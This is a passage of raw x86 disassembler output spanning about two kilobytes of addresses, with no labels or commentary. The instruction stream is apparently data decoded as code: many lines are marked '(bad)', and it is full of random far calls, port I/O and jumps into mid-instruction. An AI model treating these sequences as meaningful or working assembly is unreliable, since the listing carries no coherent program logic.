  420b63:	xchg   DWORD PTR [bp+si+0x10],edx
  420b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b68:	idiv   DWORD PTR [ecx+0x2fe7c67b]
  420b6e:	cs scas eax,DWORD PTR es:[edi]
  420b70:	cmp    eax,0xc3533062
  420b75:	jmp    0x420b44
  420b77:	fldenv [eax-0x3ab92be3]
  420b7d:	stos   DWORD PTR es:[edi],eax
  420b7e:	pop    ss
  420b7f:	scas   al,BYTE PTR es:[edi]
  420b80:	(bad)  
  420b82:	or     ecx,ecx
  420b84:	mov    cl,0xd1
  420b86:	(bad)  [ebx]
  420b88:	addr16 (bad) 
  420b8a:	scas   eax,DWORD PTR es:[edi]
  420b8b:	inc    edx
  420b8c:	pop    DWORD PTR [edi]
  420b8e:	and    al,0x2c
  420b90:	sub    dh,ah
  420b92:	fcom   QWORD PTR [edx-0x5a411492]
  420b98:	xlat   BYTE PTR ds:[ebx]
  420b99:	and    ch,BYTE PTR [edx+0x4a]
  420b9c:	dec    eax
  420b9d:	or     edi,esp
  420b9f:	inc    ecx
  420ba0:	lds    esp,FWORD PTR [edx-0x5c2132a9]
  420ba6:	dec    eax
  420ba7:	js     0x420bb0
  420ba9:	and    BYTE PTR [ebp-0x40],0x53
  420bad:	shl    BYTE PTR cs:[ebx+0x469fbca],1
  420bb4:	(bad)  
  420bb5:	xor    eax,DWORD PTR [ebx]
  420bb7:	(bad)  
  420bb9:	imul   edi,edi,0x6d
  420bbc:	pop    es
  420bbd:	pop    ds
  420bbe:	mov    bl,0x9f
  420bc0:	repnz outs dx,BYTE PTR ds:[esi]
  420bc2:	fcmovne st,st(2)
  420bc4:	es stc 
  420bc6:	popa   
  420bc7:	ret    0x102b
  420bca:	rcl    DWORD PTR [edx+0x2419cb1b],1
  420bd0:	sbb    dh,0x18
  420bd3:	mov    WORD PTR cs:[ebx],?
  420bd6:	(bad)  [edx+0x74a6b0be]
  420bdc:	sbb    bh,ch
  420bde:	gs xchg edi,eax
  420be0:	or     cl,bh
  420be2:	loop   0x420bcf
  420be4:	inc    eax
  420be5:	lahf   
  420be6:	cmp    esp,DWORD PTR [eax]
  420be8:	jg     0x420ba0
  420bea:	pop    esp
  420beb:	(bad)
  420bef:	dec    eax
  420bf0:	inc    esp
  420bf1:	inc    ebx
  420bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bf3:	rcl    DWORD PTR [edx+ecx*1-0x1e2165ed],1
  420bfa:	sub    eax,0xa34417d4
  420bff:	cmp    BYTE PTR ds:[ebp-0x7006ace0],0x1f
  420c07:	push   esi
  420c08:	lock (bad) 
  420c0a:	add    DWORD PTR [eax-0x576ad6c2],ebp
  420c10:	push   0x158a2385
  420c15:	inc    ebx
  420c16:	mov    edx,DWORD PTR [ebp+0x2f427970]
  420c1c:	mov    ecx,0x2f48bd75
  420c21:	cwde   
  420c22:	call   0xfe09:0x21bf448d
  420c29:	mov    dl,0xd3
  420c2b:	(bad)  [ebp-0x7f364f53]
  420c31:	dec    edi
  420c32:	add    esp,DWORD PTR [ebp-0x4e7318ef]
  420c38:	stos   BYTE PTR es:[edi],al
  420c39:	jbe    0x420c8b
  420c3b:	retf   0xcc10
  420c3e:	lods   eax,DWORD PTR ds:[esi]
  420c3f:	aaa    
  420c40:	dec    ecx
  420c41:	push   cs
  420c42:	js     0x420bf4
  420c44:	cdq    
  420c45:	(bad)  
  420c46:	dec    ebx
  420c47:	and    DWORD PTR [edx],ebp
  420c49:	daa    
  420c4a:	pop    esp
  420c4b:	jae    0x420c42
  420c4d:	ret    0xbf20
  420c50:	push   ebx
  420c51:	jbe    0x420cd1
  420c53:	js     0x420c4b
  420c55:	and    eax,0xcf240d4b
  420c5a:	sti    
  420c5b:	dec    esp
  420c5c:	sub    dh,bh
  420c5e:	add    al,0x27
  420c60:	push   esp
  420c61:	cmp    eax,0xe8d61396
  420c66:	xor    al,0x1d
  420c68:	fisubr WORD PTR [ebp-0x1865c53d]
  420c6e:	ss adc eax,0x27e36b8e
  420c74:	cdq    
  420c75:	aas    
  420c76:	cld    
  420c77:	cmp    edx,DWORD PTR [edi+0x6c]
  420c7a:	repnz loopne 0x420ca4
  420c7d:	xor    eax,0xbab9ba2c
  420c82:	mov    eax,0x4abfb936
  420c87:	add    eax,0x3da4d68b
  420c8c:	js     0x420c4b
  420c8e:	sbb    bl,BYTE PTR [edi+0x9]
  420c91:	inc    esi
  420c92:	pop    ss
  420c93:	fwait
  420c94:	pusha  
  420c95:	xchg   BYTE PTR [esi-0x3840b7c4],al
  420c9b:	push   ds
  420c9c:	mov    WORD PTR ds:0xca00336,fs
  420ca2:	out    dx,al
  420ca3:	pop    edi
  420ca4:	scas   al,BYTE PTR es:[edi]
  420ca5:	add    eax,0xc98c3cad
  420caa:	scas   al,BYTE PTR es:[edi]
  420cab:	cwde   
  420cac:	xchg   ebx,eax
  420cad:	ret    
  420cae:	outs   dx,BYTE PTR ds:[esi]
  420caf:	stos   DWORD PTR es:[edi],eax
  420cb0:	xchg   esp,eax
  420cb1:	push   eax
  420cb2:	mov    esp,0xba6bad47
  420cb7:	stos   BYTE PTR es:[edi],al
  420cb8:	ins    BYTE PTR es:[edi],dx
  420cb9:	push   edi
  420cba:	into   
  420cbb:	popf   
  420cbc:	sub    eax,0x6bf1c86f
  420cc1:	repz push ebx
  420cc3:	fldenv [ebp+edi*8-0x13d88ebb]
  420cca:	jg     0x420d19
  420ccc:	xchg   esi,eax
  420ccd:	jp     0x420cf3
  420ccf:	idiv   BYTE PTR [ebx-0x4e]
  420cd2:	lahf   
  420cd3:	jge    0x420c66
  420cd5:	mov    al,0x39
  420cd7:	sbb    esi,DWORD PTR [eax+0x8]
  420cda:	sub    BYTE PTR [ebp+0x61],ah
  420cdd:	push   cs
  420cde:	or     al,0x65
  420ce0:	mov    bh,0xe7
  420ce2:	int3   
  420ce3:	fsubr  st(1),st
  420ce5:	or     BYTE PTR [edx-0xb6f78c8],0x83
  420cec:	mov    ah,0x76
  420cee:	pop    ebx
  420cef:	mov    edx,0x745f7935
  420cf4:	test   DWORD PTR [ecx+ebx*2],esp
  420cf7:	xchg   ebx,eax
  420cf8:	mov    WORD PTR [esi],ss
  420cfa:	loop   0x420c92
  420cfc:	mov    ds:0xff381c15,al
  420d01:	pop    ss
  420d02:	dec    edx
  420d03:	mov    al,0x9c
  420d05:	or     ch,0x81
  420d08:	pop    ebx
  420d09:	retf   
  420d0a:	adc    DWORD PTR [edi],esi
  420d0c:	jnp    0x420d46
  420d0e:	xor    al,0xe3
  420d10:	pop    esp
  420d11:	xchg   edx,eax
  420d12:	adc    ah,al
  420d14:	enter  0x6fd1,0x39
  420d18:	xchg   edi,eax
  420d19:	jno    0x420d82
  420d1b:	adc    al,0x37
  420d1d:	mov    cl,0x53
  420d1f:	jno    0x420cd2
  420d21:	xchg   edx,eax
  420d22:	push   0x41a10f40
  420d27:	dec    edx
  420d28:	not    BYTE PTR [ecx+0x18]
  420d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d2c:	out    0xce,al
  420d2e:	iret   
  420d2f:	mov    DWORD PTR [edi],ebp
  420d31:	sbb    DWORD PTR [esi],ebp
  420d33:	out    dx,eax
  420d34:	stos   BYTE PTR es:[edi],al
  420d35:	test   al,0x5d
  420d37:	push   ss
  420d38:	xor    BYTE PTR [ecx-0x36ce5afe],ah
  420d3e:	push   edx
  420d3f:	mov    esp,0x641cf532
  420d44:	adc    edx,eax
  420d46:	cmp    eax,0xd52e9b36
  420d4b:	xchg   ecx,eax
  420d4c:	pop    ds
  420d4d:	outs   dx,DWORD PTR ds:[esi]
  420d4e:	mov    ebx,0xd09bd3bd
  420d53:	jge    0x420d4f
  420d55:	mov    ah,0xce
  420d57:	push   eax
  420d58:	push   ecx
  420d59:	xlat   BYTE PTR ds:[ebx]
  420d5a:	out    0x13,eax
  420d5c:	dec    esi
  420d5d:	add    ebp,DWORD PTR [edi-0xe]
  420d60:	push   es
  420d61:	lods   eax,DWORD PTR ds:[esi]
  420d62:	pop    eax
  420d63:	and    eax,0x98f43d37
  420d68:	jecxz  0x420d59
  420d6a:	mov    al,0x41
  420d6c:	mov    eax,0xc0591544
  420d71:	bound  eax,QWORD PTR [edi-0x24]
  420d74:	out    0xbc,eax
  420d76:	cmp    ebx,DWORD PTR ds:0x27e677e0
  420d7c:	and    DWORD PTR [edi-0x1c],0x70a41160
  420d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d84:	dec    ecx
  420d85:	stos   BYTE PTR es:[edi],al
  420d86:	mov    ah,0x4e
  420d88:	cmp    eax,0x22b6dbe2
  420d8d:	adc    BYTE PTR [ebp+ecx*8+0x23],bh
  420d91:	test   BYTE PTR [ebx],dh
  420d93:	pop    edx
  420d94:	(bad)  
  420d95:	(bad)  
  420d96:	ja     0x420d61
  420d98:	sub    BYTE PTR gs:[ebp+0x5a3957aa],0x22
  420da0:	lods   eax,DWORD PTR ds:[esi]
  420da1:	dec    edi
  420da2:	dec    ebx
  420da3:	popf   
  420da4:	mov    ebp,0xfeacb303
  420da9:	push   es
  420daa:	pop    esp
  420dab:	dec    edx
  420dac:	mov    eax,0x827c7bfd
  420db1:	sub    DWORD PTR [ecx],ebx
  420db3:	xor    bl,BYTE PTR [edx+0x40]
  420db6:	pop    edx
  420db7:	push   ds
  420db8:	test   DWORD PTR [eax-0x57100c4c],ecx
  420dbe:	lods   al,BYTE PTR ds:[esi]
  420dbf:	repnz xchg ecx,eax
  420dc1:	push   esi
  420dc2:	stos   DWORD PTR es:[edi],eax
  420dc3:	loope  0x420d7a
  420dc5:	pop    es
  420dc6:	call   0xfd17:0xa12f8e20
  420dcd:	push   esi
  420dce:	cs pop ebx
  420dd0:	push   ss
  420dd1:	mov    al,0xd8
  420dd3:	cmp    BYTE PTR [eax-0x37],al
  420dd6:	jne    0x420ddd
  420dd8:	pushf  
  420dd9:	push   0x37bb1a32
  420dde:	pop    esi
  420ddf:	pop    edx
  420de0:	in     eax,dx
  420de1:	popf   
  420de2:	mov    ds:0xedd982f2,al
  420de7:	test   DWORD PTR [esi-0x66511cf4],ebx
  420ded:	and    bh,BYTE PTR [ebp+0x2ccad186]
  420df3:	repz mov ah,0x82
  420df6:	dec    ebp
  420df7:	daa    
  420df8:	rol    ch,0x75
  420dfb:	neg    BYTE PTR [esi]
  420dfd:	adc    eax,DWORD PTR [edi+eiz*2-0x3d]
  420e01:	mov    BYTE PTR [edi+0x5ca590d6],dh
  420e07:	add    DWORD PTR [ebp+0x65],ebx
  420e0a:	inc    ecx
  420e0b:	jp     0x420dc3
  420e0d:	int3   
  420e0e:	mov    cl,0xe0
  420e10:	popf   
  420e11:	mov    edx,0xbc4fca6d
  420e16:	cwde   
  420e17:	out    dx,al
  420e18:	repnz xchg ebx,edx
  420e1b:	push   eax
  420e1c:	dec    esp
  420e1d:	and    DWORD PTR [eax+ebx*8+0x6b],esp
  420e21:	mov    ecx,0x747ed8ab
  420e26:	(bad)  
  420e27:	jp     0x420dda
  420e29:	leave  
  420e2a:	sar    DWORD PTR [eax+0x37b1fc24],cl
  420e30:	xor    eax,0xf6958f98
  420e35:	ret    0x300c
  420e38:	cmp    al,0xe5
  420e3a:	ins    BYTE PTR es:[edi],dx
  420e3b:	(bad)  
  420e3d:	pusha  
  420e3e:	inc    ecx
  420e3f:	mov    eax,0xc10c0409
  420e44:	pusha  
  420e45:	push   edx
  420e46:	jb     0x420ec0
  420e48:	or     dl,BYTE PTR [edx-0x7cfba080]
  420e4e:	xor    ch,bl
  420e50:	std    
  420e51:	hlt    
  420e52:	dec    edx
  420e53:	lahf   
  420e54:	mov    ch,0x71
  420e56:	xor    eax,0x2a0af486
  420e5b:	int    0x40
  420e5d:	add    DWORD PTR [ecx+0x79e8c856],esp
  420e63:	dec    ebx
  420e64:	daa    
  420e65:	in     al,0x61
  420e67:	push   eax
  420e68:	repnz inc esi
  420e6a:	sub    BYTE PTR [ebx+0x38c018cb],bl
  420e70:	push   0x20
  420e72:	sub    al,BYTE PTR [esp+edi*2+0x7743c418]
  420e79:	sbb    eax,0xb7f4da57
  420e7e:	sub    al,0xe8
  420e80:	xchg   BYTE PTR [ebp+0x2b],dl
  420e83:	pop    es
  420e84:	ja     0x420e51
  420e86:	jns    0x420eb2
  420e88:	nop
  420e89:	ffree  st(0)
  420e8b:	or     eax,0x9c94147d
  420e90:	scas   al,BYTE PTR es:[edi]
  420e91:	aas    
  420e92:	pop    ds
  420e93:	fisubr WORD PTR [ebx-0x22]
  420e96:	sub    eax,0x87d3dbcf
  420e9b:	mov    ecx,0xa9d568db
  420ea0:	test   DWORD PTR [edi+esi*1],ecx
  420ea3:	sbb    esi,eax
  420ea5:	into   
  420ea6:	popa   
  420ea7:	dec    eax
  420ea8:	mov    al,ds:0x847fad04
  420ead:	(bad)
  420eb1:	xor    al,0x93
  420eb3:	xchg   edi,eax
  420eb4:	inc    esp
  420eb5:	call   0x4db14ac0
  420eba:	push   ebp
  420ebb:	fistp  QWORD PTR [edi-0x213d5be6]
  420ec1:	mov    WORD PTR [ecx-0x3c],?
  420ec4:	jae    0x420ee9
  420ec6:	ret    
  420ec7:	cld    
  420ec8:	lea    ebx,[esi]
  420eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ecb:	test   al,0x3
  420ecd:	pop    edx
  420ece:	test   edi,edi
  420ed0:	inc    esi
  420ed1:	sar    BYTE PTR [eax+0x3d],cl
  420ed4:	adc    DWORD PTR [ebx],edi
  420ed6:	adc    al,0xcd
  420ed8:	mov    ch,bh
  420eda:	into   
  420edb:	xchg   edi,eax
  420edc:	jae    0x420f1e
  420ede:	pop    ebp
  420edf:	mov    eax,0x5ec5bfc9
  420ee4:	stos   DWORD PTR es:[edi],eax
  420ee5:	jbe    0x420f07
  420ee7:	out    dx,eax
  420ee8:	mov    cl,0x56
  420eea:	jecxz  0x420e6f
  420eec:	mov    bh,0x6
  420eee:	leave  
  420eef:	in     al,0xa3
  420ef1:	(bad)  
  420ef2:	ds nop
  420ef4:	int    0xdc
  420ef6:	jae    0x420f5d
  420ef8:	cmp    al,0xd
  420efa:	pop    ss
  420efb:	mov    al,0xc6
  420efd:	out    0xc3,eax
  420eff:	pop    esi
  420f00:	mov    al,0xef
  420f02:	mov    DWORD PTR [ecx+edi*4-0x4f],esi
  420f06:	xchg   DWORD PTR [esi-0x65138390],esi
  420f0c:	dec    ecx
  420f0d:	and    ebp,edx
  420f0f:	pop    eax
  420f10:	mov    ebp,DWORD PTR [eax]
  420f12:	sti    
  420f13:	cld    
  420f14:	xchg   ebx,eax
  420f15:	xchg   esi,eax
  420f16:	test   al,0x20
  420f18:	jae    0x420f53
  420f1a:	ffreep st(7)
  420f1c:	enter  0xa482,0x2a
  420f20:	mov    esi,0xe6247abb
  420f25:	stos   BYTE PTR es:[edi],al
  420f26:	lock leave 
  420f28:	div    BYTE PTR [ecx]
  420f2a:	ret    0x8b94
  420f2d:	test   eax,0xb7961581
  420f32:	jo     0x420f20
  420f34:	push   eax
  420f35:	inc    ecx
  420f36:	add    DWORD PTR [eax-0x3e4fbdf8],ecx
  420f3c:	xchg   ebx,eax
  420f3d:	int    0xc7
  420f3f:	mov    esp,esi
  420f41:	xchg   edi,eax
  420f42:	xchg   edx,eax
  420f43:	jo     0x420f29
  420f45:	mov    esp,0x9f2a4ccb
  420f4a:	jnp    0x420fc1
  420f4c:	aas    
  420f4d:	or     BYTE PTR [esi+ebp*1+0x483a11],bh
  420f54:	add    al,0x38
  420f56:	xor    eax,0x4944bc02
  420f5b:	cwde   
  420f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f5d:	cmp    edx,DWORD PTR [eax-0x19]
  420f60:	mov    cl,0x1a
  420f62:	lea    ebx,[esi-0x36]
  420f65:	xchg   edx,eax
  420f66:	(bad)  
  420f68:	call   0x88aac7af
  420f6d:	vpsubusw xmm2,xmm0,xmm5
  420f71:	add    al,0x65
  420f73:	ret    0xbbe6
  420f76:	and    BYTE PTR [eax+0x67b2b7bb],dl
  420f7c:	xchg   ebx,eax
  420f7d:	cwde   
  420f7e:	mov    ch,0xbb
  420f80:	inc    ebp
  420f81:	jge    0x420f19
  420f83:	sahf   
  420f84:	or     al,0x8
  420f86:	fdivr  QWORD PTR [edi]
  420f88:	out    dx,eax
  420f89:	imul   edx,DWORD PTR [edx+0x5a0aea92],0x5a
  420f90:	mov    esp,0x52f2c10a
  420f95:	add    edi,DWORD PTR [ebp-0x6aa47537]
  420f9b:	(bad)  
  420f9c:	icebp  
  420f9d:	int3   
  420f9e:	and    eax,0x252605ce
  420fa3:	jl     0x420feb
  420fa5:	scas   eax,DWORD PTR es:[edi]
  420fa6:	stos   DWORD PTR es:[edi],eax
  420fa7:	jp     0x420f79
  420fa9:	xchg   esp,eax
  420faa:	add    dl,BYTE PTR [edi]
  420fac:	cmp    esi,DWORD PTR [edi]
  420fae:	sbb    DWORD PTR [esi-0x15],esi
  420fb1:	sbb    al,0xc1
  420fb3:	xor    BYTE PTR [ebp+0x7],0x4c
  420fb7:	aad    0x3a
  420fb9:	popf   
  420fba:	mov    eax,ds:0xf65c1842
  420fbf:	dec    ebx
  420fc0:	dec    ecx
  420fc1:	mov    al,ds:0x2fe4632
  420fc6:	cdq    
  420fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fc8:	sbb    eax,edx
  420fca:	mov    ds:0x77850c88,eax
  420fcf:	stos   BYTE PTR es:[edi],al
  420fd0:	xchg   ecx,eax
  420fd1:	call   0x926e:0x6ecf9b77
  420fd8:	jbe    0x420f95
  420fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fdb:	mov    edi,ebp
  420fdd:	xchg   esi,eax
  420fde:	xchg   ebx,eax
  420fdf:	sub    ebp,DWORD PTR [edx-0x7de667f0]
  420fe5:	pop    ds
  420fe6:	sub    dh,BYTE PTR [ebx+0x729693e0]
  420fec:	out    dx,eax
  420fed:	jmp    0x2b4b2ed7
  420ff2:	push   cs
  420ff3:	mov    bh,BYTE PTR [ecx]
  420ff5:	cli    
  420ff6:	mov    ecx,0xdb4debde
  420ffb:	(bad)  
  420ffc:	mov    dh,0xec
  420ffe:	mov    gs,WORD PTR [ecx-0x43]
  421001:	mov    bl,0xbf
  421003:	mov    al,0x88
  421005:	jmp    DWORD PTR [ebp+0x52]
  421008:	add    dh,BYTE PTR [ecx+0x3]
  42100b:	jg     0x420fdd
  42100d:	clc    
  42100e:	(bad)  
  42100f:	icebp  
  421010:	mov    eax,ds:0xcd1c112
  421015:	or     al,0xd4
  421017:	xchg   ecx,eax
  421018:	inc    esp
  421019:	mov    bh,0x52
  42101b:	sub    al,bh
  42101d:	mov    dh,0xd4
  42101f:	call   0x36b0:0x456e11ab
  421026:	retf   0x3ec
  421029:	mov    dh,0x53
  42102b:	and    BYTE PTR [eax-0x13],ah
  42102e:	xor    eax,edi
  421030:	inc    edi
  421031:	xchg   DWORD PTR ds:0xc7a9c416,ebp
  421037:	jns    0x421038
  421039:	mov    eax,ds:0xfc3f0248
  42103e:	emms   
  421040:	hlt    
  421041:	stos   DWORD PTR es:[edi],eax
  421042:	(bad)  [ebp+ebx*2-0x9]
  421046:	jb     0x420fdb
  421048:	lods   eax,DWORD PTR ds:[esi]
  421049:	(bad)  
  42104a:	adc    eax,0xba7e103e
  42104f:	loope  0x421071
  421051:	or     eax,ebx
  421053:	in     eax,0xf1
  421055:	xor    DWORD PTR [edx-0xc],edx
  421058:	test   BYTE PTR [edi-0x4a63a0f9],bh
  42105e:	ins    BYTE PTR es:[edi],dx
  42105f:	shl    bl,1
  421061:	pop    edi
  421062:	(bad)  
  421063:	xor    BYTE PTR [edi-0x65],bl
  421066:	test   eax,0x7a058fff
  42106b:	mov    ds:0xf12ed49a,al
  421070:	jge    0x421077
  421072:	jge    0x4210a3
  421074:	or     al,0x4c
  421076:	and    eax,0xe2dd8fa1
  42107b:	pushf  
  42107c:	mov    dl,0x4d
  42107e:	mov    dl,0x9c
  421080:	inc    edi
  421081:	jecxz  0x42102b
  421083:	sbb    eax,0xc29ea5dd
  421088:	xor    BYTE PTR [edx],0xa8
  42108b:	ins    BYTE PTR es:[edi],dx
  42108c:	dec    ebx
  42108d:	mov    ch,ch
  42108f:	fisttp WORD PTR [edx-0x1a]
  421092:	adc    DWORD PTR [esi+0x6499a52a],esp
  421098:	mov    ?,WORD PTR [esi+0x10]
  42109b:	retf   
  42109c:	in     eax,dx
  42109d:	(bad)
  4210a0:	dec    esi
  4210a1:	stos   BYTE PTR es:[edi],al
  4210a2:	(bad)  
  4210a3:	mov    eax,0x8e893b9f
  4210a8:	fisub  WORD PTR [ecx-0x2]
  4210ab:	fwait
  4210ac:	(bad)  
  4210ad:	pop    edx
  4210ae:	xchg   ecx,eax
  4210af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210b0:	ds mov dl,0x85
  4210b3:	jl     0x42106b
  4210b5:	sbb    al,0x72
  4210b7:	shl    DWORD PTR [ecx+0xb],cl
  4210ba:	out    dx,al
  4210bb:	add    eax,0x7cecb485
  4210c0:	inc    edi
  4210c1:	jecxz  0x421141
  4210c3:	add    DWORD PTR [esi+0x4195afc6],eax
  4210c9:	lock mov ebp,0x5df7ad17
  4210cf:	imul   esi,DWORD PTR [ebx+0x6052ca5d],0xffffff80
  4210d6:	dec    ebx
  4210d7:	outs   dx,BYTE PTR ds:[esi]
  4210d8:	mov    ebp,0x9b1ae1b5
  4210dd:	pop    esi
  4210de:	cwde   
  4210df:	outs   dx,DWORD PTR ds:[esi]
  4210e0:	mov    al,0x53
  4210e2:	mov    BYTE PTR [ebx+0x1f0e7491],0xba
  4210e9:	pop    edx
  4210ea:	enter  0x93b,0x82
  4210ee:	(bad)  
  4210ef:	enter  0x4502,0x87
  4210f3:	push   ebx
  4210f4:	mov    esp,0xe21c5620
  4210f9:	cmp    al,0x9a
  4210fb:	fistp  DWORD PTR [edi-0xc24b6d6]
  421101:	addr16 das 
  421103:	popa   
  421104:	ss ds jne 0x421167
  421108:	mov    ch,0xf0
  42110a:	hlt    
  42110b:	dec    esi
  42110c:	scas   al,BYTE PTR es:[edi]
  42110d:	push   cs
  42110e:	mov    cl,BYTE PTR [edx-0x2b5ed487]
  421114:	and    DWORD PTR [edx],ebx
  421116:	sub    eax,0x818be771
  42111b:	dec    ebp
  42111c:	and    cl,BYTE PTR [ebx+0x28e1a7a]
  421122:	pop    ds
  421123:	aaa    
  421124:	pop    esp
  421125:	rcl    DWORD PTR [edx+edi*8-0x2c],cl
  421129:	cli    
  42112a:	mov    esi,0xefd03d3b
  42112f:	sub    DWORD PTR [ebx-0x1b],0x2d
  421133:	rol    DWORD PTR [ebp-0x16c37814],0x7
  42113a:	fidivr DWORD PTR [ebx+0x7b9b02bb]
  421140:	jmp    0x2fa207e
  421145:	jp     0x4211ad
  421147:	jmp    0x7e89d71
  42114c:	sbb    al,0x37
  42114f:	loop   0x4210e9
  421151:	sbb    eax,0x50f58b11
  421156:	clc    
  421157:	es into 
  421159:	sub    al,BYTE PTR [edi-0x16]
  42115c:	push   esi
  42115d:	in     eax,0xc2
  42115f:	popf   
  421160:	xchg   ecx,eax
  421161:	sub    ebp,DWORD PTR [ebp-0x19d73857]
  421167:	aaa    
  421168:	or     edx,esi
  42116a:	loopne 0x4211b7
  42116c:	sub    bh,BYTE PTR [edx]
  42116e:	lods   eax,DWORD PTR ds:[esi]
  421170:	in     al,dx
  421171:	call   0xe8c7:0x1546a8e
  421178:	pop    ds
  421179:	nop
  42117a:	mov    bl,0x8b
  42117c:	shl    edi,cl
  42117e:	and    BYTE PTR [ebx-0x4b6b9ef2],cl
  421184:	jecxz  0x4211a9
  421186:	iret   
  421187:	sub    ch,dl
  421189:	push   ss
  42118a:	in     eax,dx
  42118b:	call   0xf287:0x1f41fa4e
  421192:	rcl    edx,cl
  421194:	sahf   
  421195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421196:	sahf   
  421197:	les    ecx,FWORD PTR [ebx+0x46da3a42]
  42119d:	mov    ah,0xff
  42119f:	cmp    edi,DWORD PTR [ebx+esi*1]
  4211a2:	cmp    DWORD PTR [ecx+ebx*2+0x321ee374],0xb077f66f
  4211ad:	repnz cmp cl,al
  4211b0:	dec    ebp
  4211b1:	push   ebp
  4211b2:	xchg   DWORD PTR [edx],edi
  4211b4:	cli    
  4211b5:	(bad)  ds:0xb2f00cf1
  4211bb:	push   esi
  4211bc:	test   al,0x53
  4211be:	inc    edx
  4211bf:	call   0xc989b2d5
  4211c4:	call   0x75ad8c54
  4211c9:	add    ecx,ecx
  4211cb:	push   esp
  4211cc:	jb     0x4211a0
  4211ce:	scas   al,BYTE PTR es:[edi]
  4211cf:	test   ebx,esi
  4211d1:	or     eax,0xb770f079
  4211d6:	and    DWORD PTR [esi],eax
  4211d8:	aad    0x6d
  4211da:	mov    dl,BYTE PTR [ecx+ecx*2-0xac21d3e]
  4211e1:	test   DWORD PTR [ecx-0x41],esi
  4211e4:	pop    esp
  4211e5:	xchg   BYTE PTR [edi+0x5c],bh
  4211e8:	jne    0x4211cc
  4211ea:	jne    0x4211b9
  4211ec:	push   ebx
  4211ed:	xchg   edi,eax
  4211ee:	addr16 jle 0x42120b
  4211f1:	jne    0x421252
  4211f3:	dec    ebx
  4211f4:	adc    BYTE PTR [ecx+0x163b51c9],al
  4211fa:	cs push ebp
  4211fc:	add    bh,al
  4211fe:	inc    ecx
  4211ff:	adc    eax,0x3dbf1dab
  421204:	gs into 
  421206:	repnz pushf 
  421208:	rcr    BYTE PTR [edi+eax*2],cl
  42120b:	or     al,BYTE PTR [eax+0x7e]
  42120e:	enter  0x1ace,0xa
  421212:	out    dx,eax
  421213:	nop
  421214:	jg     0x42128b
  421216:	mov    eax,0xc31121ca
  42121b:	xor    eax,esi
  42121d:	sbb    BYTE PTR [ebx],0xba
  421220:	jmp    0x4211c4
  421222:	jl     0x4211b4
  421224:	mov    esi,0x27157ca8
  421229:	jo     0x4211d8
  42122b:	cmp    esi,edx
  42122d:	xchg   ecx,eax
  42122e:	jle    0x421200
  421230:	pop    es
  421231:	std    
  421232:	push   eax
  421233:	push   ss
  421234:	or     BYTE PTR [ebx-0x309db1ad],0x7
  42123b:	ret    
  42123c:	jp     0x4212b8
  42123e:	cdq    
  42123f:	sub    eax,0x27759044
  421244:	jno    0x421267
  421246:	push   ecx
  421247:	gs jg  0x42124c
  42124a:	xor    ecx,esi
  42124c:	push   cs
  42124d:	ss std 
  42124f:	push   0x6a
  421251:	xchg   ebx,eax
  421252:	mov    ah,0xf7
  421254:	in     eax,dx
  421255:	cmp    BYTE PTR ds:0x24689bcc,0x47
  42125c:	out    0x1b,eax
  42125e:	ror    BYTE PTR [esi+0x76140b08],1
  421264:	shr    DWORD PTR ds:[eax],0xd3
  421268:	in     eax,dx
  421269:	pushw  ss
  42126b:	sub    BYTE PTR [esi],0xe5
  42126e:	and    BYTE PTR [ebx+0x53],0x47
  421272:	(bad)  
  421273:	push   ss
  421274:	sub    al,0x2d
  421276:	jmp    0x516306f0
  42127b:	add    al,0x1e
  42127d:	push   edi
  42127e:	shl    BYTE PTR [esi],0xcf
  421281:	xor    BYTE PTR [ebx+0x3f4ab159],0xe5
  421288:	test   eax,0x73be17d0
  42128d:	iret   
  42128e:	xor    esi,ecx
  421290:	dec    eax
  421291:	test   BYTE PTR [esp+ecx*2],0xb5
  421295:	xchg   esi,eax
  421296:	cmp    bl,cl
  421298:	add    BYTE PTR [edi+0x5121e219],ch
  42129e:	mov    WORD PTR [edx],gs
  4212a0:	js     0x421255
  4212a2:	hlt    
  4212a3:	arpl   WORD PTR [esi-0x2153346a],sp
  4212a9:	mov    ?,WORD PTR ds:0xe9c02ff1
  4212af:	mov    eax,ds:0xabc0472
  4212b4:	les    eax,FWORD PTR [ecx+edx*8-0x609ef1d3]
  4212bb:	pop    es
  4212bc:	push   0x3d0966c8
  4212c1:	mov    ah,BYTE PTR [esi-0x52341d7e]
  4212c7:	xchg   ecx,eax
  4212c8:	jmp    0x3a58c0cb
  4212cd:	stos   BYTE PTR es:[edi],al
  4212ce:	and    DWORD PTR [eax+0x1f8ef0c7],ebp
  4212d4:	dec    esi
  4212d5:	mov    ecx,0xd2085ca6
  4212da:	jmp    0x1d00:0x43b34bc6
  4212e1:	dec    ecx
  4212e2:	je     0x421265
  4212e4:	inc    eax
  4212e5:	cdq    
  4212e6:	cmp    dl,BYTE PTR [edi]
  4212e8:	and    DWORD PTR [ebp+0x3ac6feae],ebp
  4212ee:	stc    
  4212ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f0:	out    0xb4,eax
  4212f2:	pop    esp
  4212f3:	pop    esp
  4212f4:	jle    0x421349
  4212f6:	mov    edi,DWORD PTR [ebp-0x123d6110]
  4212fc:	loop   0x421300
  4212fe:	ret    
  4212ff:	xchg   esi,eax
  421300:	jo     0x4212bd
  421302:	fist   DWORD PTR [ebx+0x2d804be4]
  421308:	dec    ecx
  421309:	leave  
  42130a:	ror    BYTE PTR [ebx],cl
  42130c:	xchg   DWORD PTR [edx-0x14e3f274],esp
  421312:	sahf   
  421313:	or     ah,BYTE PTR [eax+0x6a]
  421316:	fwait
  421317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421318:	cli    
  421319:	scas   eax,DWORD PTR es:[edi]
  42131a:	adc    ebp,DWORD PTR [edi-0x6f597fd7]
  421320:	adc    bl,BYTE PTR [eax+0x69]
  421323:	test   edi,0xf0a0f4c0
  421329:	or     al,0xc3
